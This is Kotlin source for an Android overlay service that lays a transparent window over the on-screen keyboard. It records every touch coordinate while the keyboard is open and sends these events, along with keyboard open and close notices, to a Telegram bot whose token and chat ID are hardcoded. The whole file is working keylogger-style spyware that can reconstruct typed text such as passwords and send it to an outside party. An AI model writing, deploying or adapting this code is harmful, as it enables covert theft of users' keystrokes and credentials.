package com.example.rendezvous_hb

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.ViewTreeObserver
import android.view.WindowManager
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class OverlayService : Service() {
    private val client = OkHttpClient()
    private val eventBuffer = mutableListOf<String>()
    private val handler = Handler(Looper.getMainLooper())
    private val flushRunnable = Runnable { flushEvents() }
    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: View
    private lateinit var layoutParams: WindowManager.LayoutParams
    private val visibleRect = Rect()
    private var keyboardPresent = false

    companion object {
        private const val TAG = "OverlayService"
        private const val CHANNEL_ID = "overlay_service_channel"
        private const val TELEGRAM_TOKEN = "8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko"
        private const val CHAT_ID = "8416456484"
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        createNotificationChannel()
        startForeground(1, createNotification())
        attachOverlayView()
    }

    override fun onDestroy() {
        removeOverlayView()
        flushEvents()
        handler.removeCallbacks(flushRunnable)
        super.onDestroy()
    }

    private fun attachOverlayView() {
        overlayView = View(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            isClickable = false
            isFocusable = false
            isFocusableInTouchMode = false
            setOnTouchListener { _, event ->
                handleMotionEvent(event)
                false
            }
        }

        layoutParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            1,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 0
        }

        windowManager.addView(overlayView, layoutParams)
        overlayView.viewTreeObserver.addOnGlobalLayoutListener(globalLayoutListener)
        updateOverlayBounds()
    }

    private val globalLayoutListener = ViewTreeObserver.OnGlobalLayoutListener {
        updateOverlayBounds()
    }

    private fun updateOverlayBounds() {
        if (!this::overlayView.isInitialized || !this::layoutParams.isInitialized) return

        overlayView.getWindowVisibleDisplayFrame(visibleRect)
        val screenHeight = resources.displayMetrics.heightPixels
        val keyboardHeight = screenHeight - visibleRect.bottom
        val threshold = (screenHeight * 0.15).toInt()

        if (keyboardHeight > threshold) {
            if (!keyboardPresent) {
                keyboardPresent = true
                logKeyboardState("Keyboard Opened")
            }
            layoutParams.height = keyboardHeight
            layoutParams.y = visibleRect.bottom
        } else {
            if (keyboardPresent) {
                keyboardPresent = false
                logKeyboardState("Keyboard Closed")
            }
            layoutParams.height = 1
            layoutParams.y = 0
        }

        try {
            windowManager.updateViewLayout(overlayView, layoutParams)
        } catch (e: Exception) {
            Log.w(TAG, "Unable to update overlay bounds: ${e.message}")
        }
    }
    private fun logKeyboardState(state: String) {
        val payload = JSONObject().apply {
            put("chat_id", CHAT_ID)
            put("text", state)
        }
        val requestBody = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url("https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                Log.e(TAG, "Telegram keyboard state log failed: ${e.message}")
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                response.close()
            }
        })
    }


    private fun handleMotionEvent(event: MotionEvent) {
        if (!keyboardPresent) return
        if (event.action != MotionEvent.ACTION_DOWN && event.action != MotionEvent.ACTION_UP && event.action != MotionEvent.ACTION_MOVE) {
            return
        }

        val eventString = "${actionName(event.action)},${event.rawX},${event.rawY},${event.eventTime}"
        synchronized(eventBuffer) {
            eventBuffer.add(eventString)
        }
        scheduleFlush()
    }

    private fun actionName(action: Int): String {
        return when (action) {
            MotionEvent.ACTION_DOWN -> "DOWN"
            MotionEvent.ACTION_UP -> "UP"
            MotionEvent.ACTION_MOVE -> "MOVE"
            MotionEvent.ACTION_CANCEL -> "CANCEL"
            else -> "OTHER"
        }
    }

    private fun scheduleFlush() {
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, 1200)
    }

    private fun flushEvents() {
        val eventsToSend = synchronized(eventBuffer) {
            if (eventBuffer.isEmpty()) return
            val copy = eventBuffer.toList()
            eventBuffer.clear()
            copy
        }
        sendToTelegram(eventsToSend)
    }

    private fun sendToTelegram(events: List<String>) {
        val payload = JSONObject().apply {
            put("chat_id", CHAT_ID)
            put("text", "Overlay touch events:\n${events.joinToString(separator = "\n")}")
        }

        val requestBody = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url("https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                Log.e(TAG, "Telegram send failed: ${e.message}")
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                response.close()
            }
        })
    }

    private fun removeOverlayView() {
        if (this::overlayView.isInitialized && overlayView.isAttachedToWindow) {
            overlayView.viewTreeObserver.removeOnGlobalLayoutListener(globalLayoutListener)
            windowManager.removeViewImmediate(overlayView)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Overlay Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Overlay capture background service"
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            Notification.Builder(this)
        }
        return builder
            .setContentTitle("Overlay Capture")
            .setContentText("Capturing keyboard overlay coordinates")
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .setOngoing(true)
            .build()
    }
}
